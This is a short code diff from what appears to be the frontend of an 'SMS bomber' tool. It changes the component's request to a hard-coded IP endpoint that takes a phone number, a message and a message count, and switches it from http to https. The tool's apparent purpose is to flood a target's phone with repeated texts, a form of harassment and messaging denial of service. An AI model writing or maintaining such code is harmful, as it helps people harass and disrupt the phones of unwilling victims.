@@ -39,7 +39,7 @@ function SmsBomber() {
     setError(null)
     setResult(null)
     try {
-      const res = await fetch('http://78.185.19.222:5000/api/sms-bomber', {
+      const res = await fetch('https://78.185.19.222:5000/api/sms-bomber', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, mail: message, count }),
